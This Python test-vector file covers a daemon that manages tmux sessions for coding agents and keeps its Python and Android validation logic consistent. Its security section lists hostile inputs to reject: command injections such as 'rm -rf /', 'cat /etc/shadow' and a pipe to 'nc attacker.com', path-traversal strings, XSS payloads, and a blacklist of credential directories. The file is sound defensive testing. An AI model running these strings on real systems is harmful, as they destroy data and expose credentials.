"""Test vectors for session management cross-platform validation.

These test vectors ensure protobuf encoding/decoding and validation logic
is compatible between the daemon (Python) and Android (Kotlin) implementations.

IMPORTANT: The static test vectors should be copied to the Kotlin/Android
test suite to ensure both implementations produce identical results.
"""

import base64
from dataclasses import dataclass
from typing import List


# ============================================================================
# SESSION ID GENERATION VECTORS
# ============================================================================

class TestSessionIdVectors:
    """Test vectors for session ID generation.

    Session IDs must be:
    - 12 characters (72 bits of entropy)
    - Alphanumeric only (base62 or similar)
    - Generated using CSPRNG
    """

    # Valid session IDs (for format validation)
    VALID_SESSION_IDS = [
        "abc123def456",
        "ABCDEF123456",
        "000000000000",
        "zzzzzzzzzzzz",
        "aB1cD2eF3gH4",
    ]

    # Invalid session IDs (should be rejected)
    INVALID_SESSION_IDS = [
        "",                     # Empty
        "abc123",               # Too short (6 chars)
        "abc123def456789",      # Too long (15 chars)
        "abc-123-def",          # Contains dashes
        "abc_123_def_",         # Contains underscores
        "abc 123 def ",         # Contains spaces
        "abc123def45!",         # Contains special char
        "abc123def45\n",        # Contains newline
        "../../../etc",         # Path traversal attempt
    ]


# ============================================================================
# SESSION NAME VALIDATION VECTORS
# ============================================================================

class TestSessionNameVectors:
    """Test vectors for session display name validation.

    Display names must be:
    - 1-64 characters
    - Alphanumeric, dashes, underscores, spaces
    - No leading/trailing whitespace
    - No control characters
    """

    # Valid display names
    VALID_DISPLAY_NAMES = [
        "my-project",
        "My Project",
        "project_123",
        "a",                        # Min length
        "a" * 64,                   # Max length
        "Claude Code Session",
        "test-session-001",
        "Development_Environment",
    ]

    # Invalid display names (should be rejected)
    INVALID_DISPLAY_NAMES = [
        "",                         # Empty
        " ",                        # Just whitespace
        "  my-project",             # Leading whitespace
        "my-project  ",             # Trailing whitespace
        "a" * 65,                   # Too long
        "my\nproject",              # Newline
        "my\tproject",              # Tab
        "my\x00project",            # Null byte
        "my<script>",               # HTML injection
        "my;rm -rf",                # Command injection attempt
        "../../../etc",             # Path traversal
    ]


# ============================================================================
# TMUX SESSION NAME VECTORS
# ============================================================================

class TestTmuxNameVectors:
    """Test vectors for tmux session name generation.

    Format: ras-<agent>-<sanitized_directory>
    - Agent name is lowercase
    - Directory basename is sanitized (alphanumeric, dash, underscore only)
    - Total length limited to 50 characters
    """

    # Input: (directory, agent) -> Expected tmux name
    NAME_GENERATION_VECTORS = [
        # Basic cases
        ("/home/user/myproject", "claude", "ras-claude-myproject"),
        ("/home/user/my-project", "aider", "ras-aider-my-project"),
        ("/home/user/my_project", "cursor", "ras-cursor-my_project"),

        # Mixed case agent (should lowercase)
        ("/home/user/project", "Claude", "ras-claude-project"),
        ("/home/user/project", "AIDER", "ras-aider-project"),

        # Special characters in directory (should sanitize)
        ("/home/user/my project", "claude", "ras-claude-my-project"),
        ("/home/user/my.project", "claude", "ras-claude-my-project"),
        ("/home/user/my@project", "claude", "ras-claude-my-project"),
        ("/home/user/my#project!", "claude", "ras-claude-my-project"),

        # Long directory name (should truncate)
        ("/home/user/" + "a" * 100, "claude", "ras-claude-" + "a" * 38),  # Total 50 chars

        # Path with trailing slash
        ("/home/user/project/", "claude", "ras-claude-project"),

        # Root-like paths
        ("/", "claude", "ras-claude-root"),
        ("~", "claude", "ras-claude-home"),
    ]


# ============================================================================
# DIRECTORY PATH VALIDATION VECTORS
# ============================================================================

class TestDirectoryPathVectors:
    """Test vectors for directory path validation.

    Paths must be:
    - Absolute paths (start with /)
    - Normalized (no .. or . components after normalization)
    - Within allowed directories (whitelist check)
    - Not in blacklisted directories
    """

    # Valid directory paths
    VALID_PATHS = [
        "/home/user/project",
        "/Users/dev/code",
        "/var/www/app",
        "/opt/projects/myapp",
        "/tmp/workspace",
    ]

    # Path traversal attempts (all should be rejected)
    PATH_TRAVERSAL_ATTEMPTS = [
        "../../../etc/passwd",          # Relative traversal
        "/home/user/../../../etc",      # Absolute with traversal
        "/home/user/./../../root",      # Mixed . and ..
        "/home/user//etc/passwd",       # Double slash
        "/home/user/%2e%2e/etc",        # URL encoded ..
        "/home/user/..%252f..%252f",    # Double URL encoded
        "file:///etc/passwd",           # File protocol
        "/home/user\x00/etc/passwd",    # Null byte injection
        "/home/user/project/../../../root/.ssh",
    ]

    # Common blacklist paths (should be rejected)
    BLACKLISTED_PATHS = [
        "/",                    # Root
        "/etc",                 # System config
        "/var",                 # System data
        "/usr",                 # System binaries
        "/root",                # Root home
        "/proc",                # Process info
        "/sys",                 # System info
        "/dev",                 # Devices
        "/.ssh",                # SSH keys
        "/home/user/.ssh",      # User SSH keys
        "/home/user/.gnupg",    # GPG keys
        "/home/user/.aws",      # AWS credentials
    ]


# ============================================================================
# AGENT VALIDATION VECTORS
# ============================================================================

class TestAgentVectors:
    """Test vectors for agent name validation."""

    # Known agents with their binary names
    KNOWN_AGENTS = [
        {"name": "Claude Code", "binary": "claude", "path": "/usr/local/bin/claude"},
        {"name": "Aider", "binary": "aider", "path": "/usr/local/bin/aider"},
        {"name": "Cursor", "binary": "cursor", "path": "/usr/local/bin/cursor"},
        {"name": "Cline", "binary": "cline", "path": "/usr/local/bin/cline"},
        {"name": "Open Code", "binary": "opencode", "path": "/usr/local/bin/opencode"},
        {"name": "Codex", "binary": "codex", "path": "/usr/local/bin/codex"},
    ]

    # Invalid agent names (should be rejected)
    INVALID_AGENT_NAMES = [
        "",                         # Empty
        " ",                        # Whitespace
        "rm -rf /",                 # Command injection
        "../../../bin/sh",          # Path traversal
        "claude; rm -rf",           # Command chaining
        "claude\nrm -rf",           # Newline injection
        "claude`id`",               # Backtick injection
        "claude$(id)",              # Subshell injection
        "unknown_agent",            # Not in known list
    ]


# ============================================================================
# PROTOBUF ENCODING VECTORS
# ============================================================================

class TestProtobufVectors:
    """Test vectors for protobuf message encoding/decoding.

    These ensure cross-platform compatibility between Python and Kotlin
    protobuf implementations.
    """

    # Session message vectors
    SESSION_VECTORS = [
        {
            "description": "Basic session",
            "session": {
                "id": "abc123def456",
                "tmux_name": "ras-claude-myproject",
                "display_name": "claude-myproject",
                "directory": "/home/user/myproject",
                "agent": "claude",
                "created_at": 1700000000,
                "last_activity_at": 1700000100,
                "status": 1,  # SESSION_STATUS_ACTIVE
            },
        },
        {
            "description": "Session with special characters in display name",
            "session": {
                "id": "xyz789abc012",
                "tmux_name": "ras-aider-my-project",
                "display_name": "My Development Project",
                "directory": "/home/user/my-project",
                "agent": "aider",
                "created_at": 1700000000,
                "last_activity_at": 1700000000,
                "status": 2,  # SESSION_STATUS_CREATING
            },
        },
        {
            "description": "Session with zero timestamps",
            "session": {
                "id": "000000000000",
                "tmux_name": "ras-cursor-test",
                "display_name": "test",
                "directory": "/tmp/test",
                "agent": "cursor",
                "created_at": 0,
                "last_activity_at": 0,
                "status": 0,  # SESSION_STATUS_UNKNOWN
            },
        },
    ]

    # Command message vectors
    COMMAND_VECTORS = [
        {
            "description": "List sessions command",
            "command_type": "list",
            "payload": {},
        },
        {
            "description": "Create session command",
            "command_type": "create",
            "payload": {
                "directory": "/home/user/project",
                "agent": "claude",
            },
        },
        {
            "description": "Kill session command",
            "command_type": "kill",
            "payload": {
                "session_id": "abc123def456",
            },
        },
        {
            "description": "Rename session command",
            "command_type": "rename",
            "payload": {
                "session_id": "abc123def456",
                "new_name": "My New Name",
            },
        },
        {
            "description": "Get agents command",
            "command_type": "get_agents",
            "payload": {},
        },
        {
            "description": "Get directories command (root)",
            "command_type": "get_directories",
            "payload": {
                "parent": "",
            },
        },
        {
            "description": "Get directories command (specific path)",
            "command_type": "get_directories",
            "payload": {
                "parent": "/home/user",
            },
        },
        {
            "description": "Refresh agents command",
            "command_type": "refresh_agents",
            "payload": {},
        },
    ]

    # Event message vectors
    EVENT_VECTORS = [
        {
            "description": "Session list event (empty)",
            "event_type": "list",
            "payload": {
                "sessions": [],
            },
        },
        {
            "description": "Session created event",
            "event_type": "created",
            "payload": {
                "session": {
                    "id": "abc123def456",
                    "tmux_name": "ras-claude-project",
                    "display_name": "project",
                    "directory": "/home/user/project",
                    "agent": "claude",
                    "created_at": 1700000000,
                    "last_activity_at": 1700000000,
                    "status": 1,
                },
            },
        },
        {
            "description": "Session killed event",
            "event_type": "killed",
            "payload": {
                "session_id": "abc123def456",
            },
        },
        {
            "description": "Session renamed event",
            "event_type": "renamed",
            "payload": {
                "session_id": "abc123def456",
                "new_name": "New Name",
            },
        },
        {
            "description": "Session activity event",
            "event_type": "activity",
            "payload": {
                "session_id": "abc123def456",
                "timestamp": 1700000100,
            },
        },
        {
            "description": "Session error event",
            "event_type": "error",
            "payload": {
                "error_code": "DIR_NOT_FOUND",
                "message": "Directory does not exist: /nonexistent",
                "session_id": "",
            },
        },
        {
            "description": "Agents list event",
            "event_type": "agents",
            "payload": {
                "agents": [
                    {"name": "Claude Code", "binary": "claude", "path": "/usr/local/bin/claude", "available": True},
                    {"name": "Aider", "binary": "aider", "path": "", "available": False},
                ],
            },
        },
        {
            "description": "Directories list event",
            "event_type": "directories",
            "payload": {
                "parent": "/home/user",
                "entries": [
                    {"name": "project1", "path": "/home/user/project1", "is_directory": True},
                    {"name": "project2", "path": "/home/user/project2", "is_directory": True},
                ],
                "recent": ["/home/user/project1", "/home/user/recent"],
            },
        },
    ]


# ============================================================================
# ERROR CODE VECTORS
# ============================================================================

class TestErrorCodeVectors:
    """Test vectors for error codes and messages."""

    ERROR_CODES = {
        "DIR_NOT_FOUND": {
            "description": "Directory does not exist",
            "example_message": "Directory does not exist: /nonexistent/path",
            "has_session_id": False,
        },
        "DIR_NOT_ALLOWED": {
            "description": "Directory not in whitelist or in blacklist",
            "example_message": "Directory not allowed: /etc",
            "has_session_id": False,
        },
        "AGENT_NOT_FOUND": {
            "description": "Agent binary not found or not installed",
            "example_message": "Agent not found: unknown",
            "has_session_id": False,
        },
        "SESSION_NOT_FOUND": {
            "description": "Session ID does not exist",
            "example_message": "Session not found: abc123def456",
            "has_session_id": True,
        },
        "SESSION_EXISTS": {
            "description": "Session with that name already exists",
            "example_message": "Session already exists: ras-claude-project",
            "has_session_id": False,
        },
        "TMUX_ERROR": {
            "description": "Failed to create/kill tmux session",
            "example_message": "tmux error: failed to create session",
            "has_session_id": True,
        },
        "MAX_SESSIONS_REACHED": {
            "description": "Too many concurrent sessions",
            "example_message": "Maximum sessions (20) reached",
            "has_session_id": False,
        },
        "INVALID_NAME": {
            "description": "Invalid session name",
            "example_message": "Invalid name: contains special characters",
            "has_session_id": False,
        },
        "RATE_LIMITED": {
            "description": "Too many requests",
            "example_message": "Rate limited: try again in 60 seconds",
            "has_session_id": False,
        },
    }


# ============================================================================
# RATE LIMITING VECTORS
# ============================================================================

class TestRateLimitingVectors:
    """Test vectors for rate limiting behavior."""

    # Rate limit configuration
    RATE_LIMIT_CONFIG = {
        "requests_per_minute": 10,
        "burst_size": 5,
    }

    # Test scenarios
    SCENARIOS = [
        {
            "description": "Normal usage - under limit",
            "requests_per_second": 0.1,  # 6 per minute
            "duration_seconds": 60,
            "expected_allowed": 6,
            "expected_rejected": 0,
        },
        {
            "description": "Burst within limit",
            "requests_at_once": 5,
            "expected_allowed": 5,
            "expected_rejected": 0,
        },
        {
            "description": "Burst exceeds limit",
            "requests_at_once": 15,
            "expected_allowed": 10,
            "expected_rejected": 5,
        },
        {
            "description": "Sustained high rate",
            "requests_per_second": 1.0,  # 60 per minute
            "duration_seconds": 60,
            "expected_allowed_approx": 10,
            "expected_rejected_approx": 50,
        },
    ]


# ============================================================================
# CONCURRENCY VECTORS
# ============================================================================

class TestConcurrencyVectors:
    """Test vectors for concurrent operations."""

    SCENARIOS = [
        {
            "description": "Concurrent session creation",
            "operations": [
                {"type": "create", "directory": "/home/user/project1", "agent": "claude"},
                {"type": "create", "directory": "/home/user/project2", "agent": "aider"},
                {"type": "create", "directory": "/home/user/project3", "agent": "cursor"},
            ],
            "expected_sessions": 3,
            "expected_errors": 0,
        },
        {
            "description": "Create and kill same session race",
            "operations": [
                {"type": "create", "directory": "/home/user/project", "agent": "claude"},
                {"type": "kill", "session_id": "CREATED_SESSION"},
            ],
            "note": "Either kill succeeds or session is gone",
        },
        {
            "description": "Duplicate create requests",
            "operations": [
                {"type": "create", "directory": "/home/user/project", "agent": "claude"},
                {"type": "create", "directory": "/home/user/project", "agent": "claude"},
            ],
            "expected_sessions": 1,
            "expected_errors": 1,  # SESSION_EXISTS
        },
        {
            "description": "Rename during kill",
            "operations": [
                {"type": "kill", "session_id": "SESSION_1"},
                {"type": "rename", "session_id": "SESSION_1", "new_name": "new"},
            ],
            "note": "Rename should fail with SESSION_NOT_FOUND",
        },
    ]


# ============================================================================
# END-TO-END FLOW VECTORS
# ============================================================================

class TestE2EFlowVectors:
    """End-to-end test flow vectors."""

    FLOWS = [
        {
            "name": "Complete session lifecycle",
            "steps": [
                {"action": "list_sessions", "expect": {"count": 0}},
                {"action": "get_agents", "expect": {"at_least_one_available": True}},
                {"action": "get_directories", "parent": "", "expect": {"has_recent": True}},
                {"action": "create_session", "directory": "/home/user/project", "agent": "claude"},
                {"action": "wait_for_event", "type": "created"},
                {"action": "list_sessions", "expect": {"count": 1}},
                {"action": "rename_session", "new_name": "My Project"},
                {"action": "wait_for_event", "type": "renamed"},
                {"action": "kill_session"},
                {"action": "wait_for_event", "type": "killed"},
                {"action": "list_sessions", "expect": {"count": 0}},
            ],
        },
        {
            "name": "Error handling flow",
            "steps": [
                {"action": "create_session", "directory": "/nonexistent", "agent": "claude"},
                {"action": "wait_for_event", "type": "error", "code": "DIR_NOT_FOUND"},
                {"action": "create_session", "directory": "/etc", "agent": "claude"},
                {"action": "wait_for_event", "type": "error", "code": "DIR_NOT_ALLOWED"},
                {"action": "create_session", "directory": "/home/user/project", "agent": "unknown"},
                {"action": "wait_for_event", "type": "error", "code": "AGENT_NOT_FOUND"},
            ],
        },
        {
            "name": "Reconnection flow",
            "steps": [
                {"action": "create_session", "directory": "/home/user/project1", "agent": "claude"},
                {"action": "create_session", "directory": "/home/user/project2", "agent": "aider"},
                {"action": "disconnect"},
                {"action": "reconnect"},
                {"action": "list_sessions", "expect": {"count": 2}},
                {"action": "verify_sessions_intact"},
            ],
        },
        {
            "name": "Daemon restart reconciliation",
            "steps": [
                {"action": "create_session", "directory": "/home/user/project", "agent": "claude"},
                {"action": "stop_daemon"},
                {"action": "start_daemon"},
                {"action": "list_sessions", "expect": {"count": 1}},
                {"action": "verify_session_adopted"},
            ],
        },
        {
            "name": "Max sessions limit",
            "steps": [
                {"action": "create_sessions", "count": 20},
                {"action": "list_sessions", "expect": {"count": 20}},
                {"action": "create_session", "directory": "/home/user/project21", "agent": "claude"},
                {"action": "wait_for_event", "type": "error", "code": "MAX_SESSIONS_REACHED"},
                {"action": "kill_session", "index": 0},
                {"action": "create_session", "directory": "/home/user/project21", "agent": "claude"},
                {"action": "wait_for_event", "type": "created"},
            ],
        },
    ]


# ============================================================================
# SECURITY VECTORS
# ============================================================================

class TestSecurityVectors:
    """Security-focused test vectors."""

    # Command injection attempts (all should be sanitized/rejected)
    COMMAND_INJECTION_ATTEMPTS = [
        "claude; rm -rf /",
        "claude && cat /etc/passwd",
        "claude | nc attacker.com 1234",
        "claude`id`",
        "claude$(whoami)",
        "claude\nrm -rf /",
        "claude\x00; id",
        "$(touch /tmp/pwned)",
        "`touch /tmp/pwned`",
        "| cat /etc/shadow",
        "; cat /etc/shadow",
        "& cat /etc/shadow",
        "\"; cat /etc/shadow",
        "'; cat /etc/shadow",
    ]

    # Path traversal attempts (all should be rejected)
    PATH_TRAVERSAL_ATTEMPTS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "/home/user/../../../etc",
        "/home/user/./../../etc",
        "....//....//etc",
        "..%2f..%2f..%2fetc",
        "..%252f..%252f..%252fetc",
        "%2e%2e%2f%2e%2e%2f",
        "..%c0%af..%c0%afetc",
        "..%25c0%25af..%25c0%25af",
    ]

    # XSS attempts in session names (should be sanitized)
    XSS_ATTEMPTS = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<svg onload=alert('xss')>",
        "'\"><script>alert('xss')</script>",
    ]
